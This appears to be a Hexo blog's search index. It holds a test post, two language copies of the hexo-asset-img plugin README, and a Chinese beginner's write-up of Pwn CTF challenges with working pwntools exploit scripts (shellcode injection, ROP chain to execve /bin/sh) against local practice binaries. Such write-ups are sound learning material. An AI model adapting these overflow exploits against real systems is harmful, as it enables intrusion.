<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>test</title>
      <link href="/2024/12/08/test/"/>
      <url>/2024/12/08/test/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p><img src="/2024/12/08/test/test%5Cimage-20241208123822571.png" alt="image-20241208123822571"></p><p>本人一更新，发现所有图片都不能加载了，已经破了。寒假再说，已经破大防了</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/12/08/node_modules/hexo-asset-img/README/"/>
      <url>/2024/12/08/node_modules/hexo-asset-img/README/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p align="center"><!-- <img src="docs/.vuepress/public/images/logo.png" alt="hexo-asset-img"> --></p><h1 align="center">hexo-asset-img</h1><p>English | <a href="README_zh.md">中文</a></p><blockquote><p>:cake: Hexo local image plugin: Convert the relative path of the image to asset_img</p></blockquote><p><a href><img src="https://img.shields.io/github/repo-size/yiyungent/hexo-asset-img.svg?style=flat" alt="repo size"></a><br><a href="https://github.com/yiyungent/hexo-asset-img/blob/master/LICENSE"><img src="https://img.shields.io/github/license/yiyungent/hexo-asset-img.svg?style=flat" alt="LICENSE"></a><br><a href="https://www.npmjs.com/package/hexo-asset-img"><img src="https://img.shields.io/npm/v/hexo-asset-img.svg" alt="NPM version"></a><br><a href="https://www.npmjs.com/package/hexo-asset-img"><img src="https://img.shields.io/npm/dt/hexo-asset-img" alt="NPM downloads"></a><br><a href="https://jq.qq.com/?_wv=1027&k=q5R82fYN"><img src="https://img.shields.io/badge/QQ%20Group-894031109-deepgreen" alt="QQ Group"></a></p><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>Use this plug-in to realize the preview of Markdown editors such as Typora and Hexo release preview, both of which can display pictures normally</p><h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-asset-img --save</span><br></pre></td></tr></table></figure><blockquote><p>Latest Dev</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install git://github.com/yiyungent/hexo-asset-img.git#main</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo-typora</span><br><span class="line">├── apppicker.jpg</span><br><span class="line">├── logo.png</span><br><span class="line">└── rules.jpg</span><br><span class="line">hexo-typora.md</span><br></pre></td></tr></table></figure><p>Make sure <code>post_asset_folder: true</code> in your <code>_config.yml</code>.</p><p><code>hexo-typora.md</code>: Just use <code>![logo](hexo-typora/logo.png)</code> to insert <code>logo.png</code>.</p><h3 id="Use-with-Typora"><a href="#Use-with-Typora" class="headerlink" title="Use with Typora"></a>Use with Typora</h3><ul><li><a href="https://moeci.com/posts/hexo-typora">Hexo + Typora + Hexo plug-in development to solve the inconsistency of image paths | yiyun’s Blog</a></li></ul><h2 id="Origin"><a href="#Origin" class="headerlink" title="Origin"></a>Origin</h2><p><a href="https://github.com/xcodebuild/hexo-asset-image">hexo-asset-image</a> No longer valid, probably starting from <code>Hexo 5</code>, and this repository has been archived </p><blockquote><p>Q: 为什么使用本地图片 而不是网络图片 (图床) ?<br>A:</p><ol><li>第三方图床不稳定, 容易丢失图片    </li><li>自行搭建图床, 随着上传错误图片, 删除文章而没有删除关联图片 次数的增多, 未引用图片越来越多, 图床中也越来越多的无用冗余图片, 还不方便删除, 也容易误删除     </li><li>本地图片 与 文章在一个文件夹, 易打包, 在无网络或网络较差时也能预览   </li><li>本地图片 放在与 文章文件名同名文件夹内 方便管理</li></ol><p><code>补充:</code><br>很多 <code>markdown编辑器</code> 提供粘贴图片到本地图片文件夹, 这些图片文件名通常不易读, 较长, 如果每次删除文章中的图片引用, 都手动去删除相应图片, 以及删除文章, 手动删除关联图片文件夹, 比较麻烦, 但不删除, 未引用图片又会越来越多, 因此 <code>删除未引用图片工具</code> 应运而生!      </p><ul><li><a href="https://github.com/yiyungent/clear-image-action">yiyungent&#x2F;clear-image-action: 🔧 Image detection. | 图片检测 | 清理未引用图片 | 删除未引用图片 | 检查引用的图片是否有效 | GitHub Actions</a></li><li><a href="https://github.com/yiyungent/coo">yiyungent&#x2F;coo: 🧰 .NET 自用CLI, 工具集</a></li></ul></blockquote><h2 id="Related-Projects"><a href="#Related-Projects" class="headerlink" title="Related Projects"></a>Related Projects</h2><ul><li><a href="https://github.com/yiyungent/clear-image-action">yiyungent&#x2F;clear-image-action: 🔧 Image detection. | 图片检测 | 清理未引用图片 | 删除未引用图片 | 检查引用的图片是否有效 | GitHub Actions</a></li><li><a href="https://github.com/xcodebuild/hexo-asset-image">xcodebuild&#x2F;hexo-asset-image</a></li><li><a href="https://github.com/cocowool/hexo-image-link">cocowool&#x2F;hexo-image-link</a></li><li><a href="https://github.com/cnzsb/hexo-asset">cnzsb&#x2F;hexo-asset</a></li></ul><h2 id="Donate"><a href="#Donate" class="headerlink" title="Donate"></a>Donate</h2><p>hexo-asset-img is an MIT licensed open source project and completely free to use. However, the amount of effort needed to maintain and develop new features for the project is not sustainable without proper financial backing.</p><p>We accept donations through these channels:</p><ul><li><a href="https://afdian.net/@yiyun" target="_blank">爱发电</a></li></ul><h2 id="Author"><a href="#Author" class="headerlink" title="Author"></a>Author</h2><p><strong>hexo-asset-img</strong> © <a href="https://github.com/yiyungent">yiyun</a>, Released under the <a href="./LICENSE">MIT</a> License.<br><br>Authored and maintained by yiyun with help from contributors (<a href="https://github.com/yiyungent/hexo-asset-img/contributors">list</a>).</p><blockquote><p>GitHub <a href="https://github.com/yiyungent">@yiyungent</a> Gitee <a href="https://gitee.com/yiyungent">@yiyungent</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/12/08/node_modules/hexo-asset-img/README_zh/"/>
      <url>/2024/12/08/node_modules/hexo-asset-img/README_zh/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p align="center"><!-- <img src="docs/.vuepress/public/images/logo.png" alt="hexo-asset-img"> --></p><h1 align="center">hexo-asset-img</h1><p><a href="README.md">English</a> | 中文</p><blockquote><p>:cake: Hexo 本地图片插件: 转换 图片相对路径 为 asset_img</p></blockquote><p><a href><img src="https://img.shields.io/github/repo-size/yiyungent/hexo-asset-img.svg?style=flat" alt="repo size"></a><br><a href="https://github.com/yiyungent/hexo-asset-img/blob/master/LICENSE"><img src="https://img.shields.io/github/license/yiyungent/hexo-asset-img.svg?style=flat" alt="LICENSE"></a><br><a href="https://www.npmjs.com/package/hexo-asset-img"><img src="https://img.shields.io/npm/v/hexo-asset-img.svg" alt="NPM version"></a><br><a href="https://www.npmjs.com/package/hexo-asset-img"><img src="https://img.shields.io/npm/dt/hexo-asset-img" alt="NPM downloads"></a><br><a href="https://jq.qq.com/?_wv=1027&k=q5R82fYN"><img src="https://img.shields.io/badge/QQ%20Group-894031109-deepgreen" alt="QQ Group"></a></p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>使用本插件 即可实现 Typora 等 Markdown 编辑器预览 与 Hexo 发布预览 均能正常显示图片</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-asset-img --save</span><br></pre></td></tr></table></figure><blockquote><p>最新开发版</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install git://github.com/yiyungent/hexo-asset-img.git#main</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo-typora</span><br><span class="line">├── apppicker.jpg</span><br><span class="line">├── logo.png</span><br><span class="line">└── rules.jpg</span><br><span class="line">hexo-typora.md</span><br></pre></td></tr></table></figure><p>Make sure <code>post_asset_folder: true</code> in your <code>_config.yml</code>.</p><p><code>hexo-typora.md</code>: Just use <code>![logo](hexo-typora/logo.png)</code> to insert <code>logo.png</code>.</p><h3 id="与-Typora-配合使用"><a href="#与-Typora-配合使用" class="headerlink" title="与 Typora 配合使用"></a>与 Typora 配合使用</h3><ul><li><a href="https://moeci.com/posts/hexo-typora">Hexo + Typora + 开发Hexo插件 解决图片路径不一致 | yiyun’s Blog</a></li></ul><h2 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h2><p><a href="https://github.com/xcodebuild/hexo-asset-image">hexo-asset-image</a> 已无效, 大概是从 <code>Hexo 5</code> 开始，并且此仓库已 archived </p><blockquote><p>Q: 为什么使用本地图片 而不是网络图片 (图床) ?<br>A:</p><ol><li>第三方图床不稳定, 容易丢失图片    </li><li>自行搭建图床, 随着上传错误图片, 删除文章而没有删除关联图片 次数的增多, 未引用图片越来越多, 图床中也越来越多的无用冗余图片, 还不方便删除, 也容易误删除     </li><li>本地图片 与 文章在一个文件夹, 易打包, 在无网络或网络较差时也能预览   </li><li>本地图片 放在与 文章文件名同名文件夹内 方便管理</li></ol><p><code>补充:</code><br>很多 <code>markdown编辑器</code> 提供粘贴图片到本地图片文件夹, 这些图片文件名通常不易读, 较长, 如果每次删除文章中的图片引用, 都手动去删除相应图片, 以及删除文章, 手动删除关联图片文件夹, 比较麻烦, 但不删除, 未引用图片又会越来越多, 因此 <code>删除未引用图片工具</code> 应运而生!      </p><ul><li><a href="https://github.com/yiyungent/clear-image-action">yiyungent&#x2F;clear-image-action: 🔧 Image detection. | 图片检测 | 清理未引用图片 | 删除未引用图片 | 检查引用的图片是否有效 | GitHub Actions</a></li><li><a href="https://github.com/yiyungent/coo">yiyungent&#x2F;coo: 🧰 .NET 自用CLI, 工具集</a></li></ul></blockquote><h2 id="相关项目"><a href="#相关项目" class="headerlink" title="相关项目"></a>相关项目</h2><ul><li><a href="https://github.com/yiyungent/clear-image-action">yiyungent&#x2F;clear-image-action: 🔧 Image detection. | 图片检测 | 清理未引用图片 | 删除未引用图片 | 检查引用的图片是否有效 | GitHub Actions</a></li><li><a href="https://github.com/xcodebuild/hexo-asset-image">xcodebuild&#x2F;hexo-asset-image</a></li><li><a href="https://github.com/cocowool/hexo-image-link">cocowool&#x2F;hexo-image-link</a></li><li><a href="https://github.com/cnzsb/hexo-asset">cnzsb&#x2F;hexo-asset</a></li></ul><h2 id="Donate"><a href="#Donate" class="headerlink" title="Donate"></a>Donate</h2><p>hexo-asset-img is an MIT licensed open source project and completely free to use. However, the amount of effort needed to maintain and develop new features for the project is not sustainable without proper financial backing.</p><p>We accept donations through these channels:</p><ul><li><a href="https://afdian.net/@yiyun" target="_blank">爱发电</a></li></ul><h2 id="Author"><a href="#Author" class="headerlink" title="Author"></a>Author</h2><p><strong>hexo-asset-img</strong> © <a href="https://github.com/yiyungent">yiyun</a>, Released under the <a href="./LICENSE">MIT</a> License.<br><br>Authored and maintained by yiyun with help from contributors (<a href="https://github.com/yiyungent/hexo-asset-img/contributors">list</a>).</p><blockquote><p>GitHub <a href="https://github.com/yiyungent">@yiyungent</a> Gitee <a href="https://gitee.com/yiyungent">@yiyungent</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Pwn题解</title>
      <link href="/2024/11/24/Pwn%E9%A2%98%E8%A7%A3/"/>
      <url>/2024/11/24/Pwn%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="从0开始的Pwn生活"><a href="#从0开始的Pwn生活" class="headerlink" title="从0开始的Pwn生活"></a>从0开始的Pwn生活</h1><p>与其说是题解，不如说是萌新初次见面的哦哈呦</p><h1 id="Ret2text"><a href="#Ret2text" class="headerlink" title="Ret2text"></a>Ret2text</h1><p>没得说，复习的时候再写</p><p>更权威的查找后门函数方法：</p><ol><li>ctrl + F搜索 system</li><li>shift + F12看有没有字符串 &#x2F;bin&#x2F;sh</li></ol><h1 id="Ret2ShellCode"><a href="#Ret2ShellCode" class="headerlink" title="Ret2ShellCode"></a>Ret2ShellCode</h1><h4 id="第一次的思路"><a href="#第一次的思路" class="headerlink" title="第一次的思路"></a>第一次的思路</h4><h5 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h5><img src="/2024/11/24/Pwn%E9%A2%98%E8%A7%A3/11/24/Pwn%E9%A2%98%E8%A7%A3/image-20241124203338698.png" class title="image-20241124203338698"><p>保护 &#x3D;  ZERO</p><p>32位</p><h5 id="IDA下静态调试"><a href="#IDA下静态调试" class="headerlink" title="IDA下静态调试"></a>IDA下静态调试</h5><img src="/2024/11/24/Pwn%E9%A2%98%E8%A7%A3/11/24/Pwn%E9%A2%98%E8%A7%A3/image-20241124203655566.png" class title="image-20241124203655566"> <p>setvbuf是清空缓冲区。简单来说就是说不要设置输入输出缓冲区，不然没满发不出去。</p><p>这个gets很关键，基本判别是溢出解法。</p><p>执行内容位把s的值赋给buf2</p><p>让我们查看下buf2的位置</p><p>​                                                                                                                                                                                                                                                                                                                                                                                             </p><img src="/2024/11/24/Pwn%E9%A2%98%E8%A7%A3/11/24/Pwn%E9%A2%98%E8%A7%A3/image-20241124204040843.png" class title="image-20241124204040843">                                                                                                                                                                           <p>bss区域是可执行的，只需要在这里覆盖上我们需要执行的代码就好了</p><p>返回地址覆盖位这个bss的地址</p><style>.ojdbpbyiuczw{zoom: 33%;}</style><img src="/2024/11/24/Pwn%E9%A2%98%E8%A7%A3/11/24/Pwn%E9%A2%98%E8%A7%A3/image-20241124213147737.png" class="ojdbpbyiuczw" alt="image-20241124213147737"><p>所以我猜测应该是覆盖strcpy的返回地址到buf2数组的地址，数组内容应该是&#x2F;bin&#x2F;sh对应的机器码</p><p>payload &#x3D; 0x64+4的无效数据加上&#x2F;bin&#x2F;sh的机器码</p><h4 id="正确思路"><a href="#正确思路" class="headerlink" title="正确思路"></a>正确思路</h4><p>s是一个局部变量，gets可以将任意长度的字符赋值给s。当输入过长时，一直向高地址溢出可能覆盖main函数的返回地址。所以溢出的栈帧应该是main函数的栈帧</p><img src="/2024/11/24/Pwn%E9%A2%98%E8%A7%A3/11/24/Pwn%E9%A2%98%E8%A7%A3/image-20241124213831067.png" class title="image-20241124213831067"> <p>这里看到，距离ebp刚好是100字节。</p><p>ebp指向的是栈底，紧随其后的就是previous ebp，再往后面就是return address了</p><p>不过静态调试分析不一定正确，题目可能有灵活性。此时需要动态调试。动态才是真正的实践出真知。</p><h5 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h5><p>gets输入后直接看栈内容</p><img src="/2024/11/24/Pwn%E9%A2%98%E8%A7%A3/11/24/Pwn%E9%A2%98%E8%A7%A3/image-20241124214947632.png" class title="image-20241124214947632"> <p>首先第一行，esp。它的意思是，这里存的是一个指针，AAAA是这个指针存的内容</p><p>AAAA实际的位置在cddc处</p><p>向上查看寄存器ebp的值              </p><img src="/2024/11/24/Pwn%E9%A2%98%E8%A7%A3/11/24/Pwn%E9%A2%98%E8%A7%A3/image-20241124215221005.png" class title="image-20241124215221005"> <p>从eax到ebp就是应该填充的数组的值，然后再用4字节垃圾数据填充掉previous ebp，最后覆盖返回地址即可</p><p><strong>结果地址差是108，并非100</strong>。这是为什么？</p><h5 id="写攻击脚本"><a href="#写攻击脚本" class="headerlink" title="写攻击脚本"></a>写攻击脚本</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.ljust(<span class="number">112</span>,<span class="string">b&#x27;A&#x27;</span>)+p32(<span class="number">0x0804A080</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>ljust(int n,char c) 前方字节流不变，后方补充数据C直到到达n个字节</p><img src="/2024/11/24/Pwn%E9%A2%98%E8%A7%A3/11/24/Pwn%E9%A2%98%E8%A7%A3/image-20241124223816018.png" class title="image-20241124223816018"> <p>这不对啊 :question:</p><p><img src="/2024/11/24/Pwn%E9%A2%98%E8%A7%A3/Pwn%E9%A2%98%E8%A7%A3%5Cimage-20241125105258338.png" alt="image-20241125105258338"> </p><p>仔细一看，bss段竟然没有可执行权限。这和说好的不一样啊</p><p>破案了，LInux内核问题，不用纠结这题就是这样做的。</p><p>当然也可以用mprotect函数或者换到Ubuntu 18以下的版本</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>动态调试和静态分析的结果可能有区别，一切按照动态调试的来。所以找长度的时候出了错</p><p>另外需要通过pwntools来生成shellcode的机器码</p><h1 id="NewStarCTF-公开赛赛道-ret2shellcode"><a href="#NewStarCTF-公开赛赛道-ret2shellcode" class="headerlink" title="[NewStarCTF 公开赛赛道] ret2shellcode"></a>[NewStarCTF 公开赛赛道] ret2shellcode</h1><h4 id="第一次的思路-1"><a href="#第一次的思路-1" class="headerlink" title="第一次的思路"></a>第一次的思路</h4><h5 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h5><img src="/2024/11/24/Pwn%E9%A2%98%E8%A7%A3/11/24/Pwn%E9%A2%98%E8%A7%A3/image-20241126203800780.png" class title="image-20241126203800780"><p>没有Canary保护的话，将返回地址覆盖是可行的。应该还是传统栈溢出。</p><p>注意是64位</p><h5 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h5><img src="/2024/11/24/Pwn%E9%A2%98%E8%A7%A3/11/24/Pwn%E9%A2%98%E8%A7%A3/image-20241126200304228.png" class title="image-20241126200304228"> <p>关键有三步，第一步有一个mmap函数（这是啥我不知道），第二步向buf数组<strong>标准输入</strong>0x100字节的数据，第三步向v4数组标准输入0x100字节的数据。ULL后缀目的是确保编译器正确解析该数字的类型。</p><p><strong>read和gets的区别在于：</strong></p><p><code>read</code>需要指定读取长度，可以避免缓冲区溢出；<code>gets</code>读取输入直到\n出现，会导致缓冲区溢出</p><p><code>read</code>需要手动处理读取的字节并在缓冲区末尾添加\0形成字符串；<code>gets</code>自动在字符串末尾田间空字符\0形成字符串</p><p>百度一下：<code>mmap</code> </p><p><a href="https://www.cnblogs.com/huxiao-tee/p/4660352.html">https://www.cnblogs.com/huxiao-tee/p/4660352.html</a></p><p><strong>内存映射：</strong>简而言之就是将用户空间的一段内存区域映射到内核空间，映射成功后，用户对这段内存区域的修改可以直接反映到内核空间，同样，内核空间对这段区域的修改也直接反映用户空间。</p><p><code>mmap</code>是一种<strong>内存映射文件的方法</strong>，即将一个文件或者其它对象映射到进程的地址空间，实现文件磁盘地址和进程虚拟地址空间中一段虚拟地址的一一对映关系。</p><p><strong>函数原型</strong>：<code>void *mmap(void *start, size_t length, int prot, int flags, int fd, off_t offset);</code></p><p>start：映射区的开始地址</p><p>length：映射区的长度</p><p>prot：期望的内存保护标志</p><p>flags：指定映射对象的类型，映射选项和映射页是否可以共享</p><p>fd：有效的文件描述词</p><p>offset：被映射对象内容的起点</p><p>这个时候第一步就清楚了，即将buf映射到一个4096字节的内存，其起始地址为虚拟地址0x233000，且该内存空间<strong>可读可写可执行</strong>（省略了动态分析vmmap没发现有rwx段）</p><p>找到可读可写可执行，思路一下子就清晰了，将shellcode通过buf数组映射到这个虚拟空间，然后通过v4覆盖返回地址，覆盖的返回地址恰好为这个映射区的起始地址。<del>对还是不对？</del></p><p>那么第一次写入的数据就是shellcode &#x3D; asm(shellcraft.sh())</p><p>第二次写入的数据便为(0x30+8)的垃圾数据加上p64(0x233000)</p><p>发现一个小问题，这里会把 buf覆盖掉吗 （buf[]的首地址），覆盖了会有影响吗。</p><h5 id="写脚本"><a href="#写脚本" class="headerlink" title="写脚本"></a>写脚本</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">addr = <span class="number">0x233000</span></span><br><span class="line">payload = (<span class="number">0x30</span>+<span class="number">8</span>)*<span class="string">b&#x27;A&#x27;</span>+p64(<span class="number">0x233000</span>)</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h5 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h5><img src="/2024/11/24/Pwn%E9%A2%98%E8%A7%A3/11/24/Pwn%E9%A2%98%E8%A7%A3/image-20241126205924180.png" class title="image-20241126205924180"><p>卧槽，你浩锅，直接过了</p><p>也是第一次没看提示解出来一道pwn题（抛开查了查mmap函数不谈）</p><h1 id="Ret2Syscall"><a href="#Ret2Syscall" class="headerlink" title="Ret2Syscall"></a>Ret2Syscall</h1><h4 id="哈吉咩得"><a href="#哈吉咩得" class="headerlink" title="哈吉咩得"></a>哈吉咩得</h4><h5 id="checksec-1"><a href="#checksec-1" class="headerlink" title="checksec"></a>checksec</h5><img src="/2024/11/24/Pwn%E9%A2%98%E8%A7%A3/11/24/Pwn%E9%A2%98%E8%A7%A3/image-20241128143917697.png" class title="image-20241128143917697"> <p>32位，无保护，栈溢出</p><h5 id="静态分析-1"><a href="#静态分析-1" class="headerlink" title="静态分析"></a>静态分析</h5><img src="/2024/11/24/Pwn%E9%A2%98%E8%A7%A3/11/24/Pwn%E9%A2%98%E8%A7%A3/image-20241128144009902.png" class title="image-20241128144009902"> <p>通过v4数组覆盖main函数的返回地址</p><p>其长度为0x64+4</p><p>而且这次没有后门函数也不能注入shellcode。考虑ROP，系统调用</p><h5 id="找到gadget地址"><a href="#找到gadget地址" class="headerlink" title="找到gadget地址"></a>找到gadget地址</h5><img src="/2024/11/24/Pwn%E9%A2%98%E8%A7%A3/11/24/Pwn%E9%A2%98%E8%A7%A3/image-20241128144400349.png" class title="image-20241128144400349"> <p>首先想想&#x2F;bin&#x2F;sh得系统调用流程是什么</p><img src="/2024/11/24/Pwn%E9%A2%98%E8%A7%A3/11/24/Pwn%E9%A2%98%E8%A7%A3/image-20241128144455036.png" class title="image-20241128144455036"> <p>于是我们需要得分别有</p><p><code>pop eax；ret</code>地址0x080bb196</p><p><code>pop ebx；ret</code>地址0x0804838e</p><p>关于ecx和edx应该需要清空一下的吧。但是这里如果pop，ret感觉很麻烦。但找不到xor，ret就算了</p><p>所以</p><p> <code>xor ecx，ecx；ret</code>   或者 pop ret地址</p><p><code>xor edx，edx；ret</code>  或者  pop ret</p><p><code>int 0x80</code></p><p>这些是我们需要的gadget。</p><p>但事实上发现只有xor eax，eax，所以ecx，edx应该是不需要怎么管的。</p><h5 id="构建payload"><a href="#构建payload" class="headerlink" title="构建payload"></a>构建payload</h5><p>pop的东东是栈顶元素，即esp指向的数。而v4数组在esp的上方。说明没办法通过v4来修改esp指向内容的值啊。</p><p>那该怎么办。</p><p>唐了，记住esp一直指向栈顶。</p><h4 id="正确思路-1"><a href="#正确思路-1" class="headerlink" title="正确思路"></a>正确思路</h4><h5 id="寻找后门函数"><a href="#寻找后门函数" class="headerlink" title="寻找后门函数"></a>寻找后门函数</h5><img src="/2024/11/24/Pwn%E9%A2%98%E8%A7%A3/11/24/Pwn%E9%A2%98%E8%A7%A3/image-20241128150557112.png" class title="image-20241128150557112"> <p>尝试了两种方法（第一题），只找到了字符串（后门函数对应的参数），但没找到后门函数（system）。</p><h5 id="找gadget"><a href="#找gadget" class="headerlink" title="找gadget"></a>找gadget</h5><p><code>ROPgadget --binary ret2syscall --only &quot;pop|ret&quot; | grep eax</code>找到第一个gadget。其他以此类推</p><p>ecx和edx其实第一次构建payload的时候无需在意。因为一般情况下这个时候ecx和edx为0。可以先试试看，如果有问题再说。</p><p>这里找到两个gadget：</p><p>0x080bb196 : pop eax ; ret</p><p>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</p><p>找不到的就替代。</p><p>最后 0x08049421 : int 0x80</p><img src="/2024/11/24/Pwn%E9%A2%98%E8%A7%A3/11/24/Pwn%E9%A2%98%E8%A7%A3/image-20241128152855316.png" class title="image-20241128152855316"> <p>从下到上得看</p><h5 id="动态调试尝试覆盖原有返回地址"><a href="#动态调试尝试覆盖原有返回地址" class="headerlink" title="动态调试尝试覆盖原有返回地址"></a>动态调试尝试覆盖原有返回地址</h5> <img src="/2024/11/24/Pwn%E9%A2%98%E8%A7%A3/11/24/Pwn%E9%A2%98%E8%A7%A3/image-20241129101348955.png" class title="image-20241129101348955"><img src="/2024/11/24/Pwn%E9%A2%98%E8%A7%A3/11/24/Pwn%E9%A2%98%E8%A7%A3/image-20241129101419976.png" class title="image-20241129101419976"> <p>这又是一道动态调试和静态分析结果不相同得一道题。结果需要注入（0x88-0x1c+4）的垃圾数据</p><h5 id="构建payload，编写exp"><a href="#构建payload，编写exp" class="headerlink" title="构建payload，编写exp"></a>构建payload，编写exp</h5><p><code>flat</code> 是 <code>pwntools</code> 提供的另一个函数，用于将传入的列表展平为一个连续的字节串。它会将列表中的元素（比如字节串、整数等）按顺序组合成一个连续的内存块。</p><p><code>payload = flat([b&#39;A&#39;*(112),pop_eax_addr, 0xb , pop_edx_ecx_ebx_addr, 0 , 0 , 0x80be408, int80_addr])</code></p><p>以下为exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./ret2syscall&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_addr = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_addr = <span class="number">0x0806eb90</span></span><br><span class="line">int80_addr = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span>*(<span class="number">112</span>), pop_eax_addr , <span class="number">0xb</span>,pop_edx_ecx_ebx_addr, <span class="number">0</span>,<span class="number">0</span>,binsh, int80_addr])</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn学习</title>
      <link href="/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/</url>
      
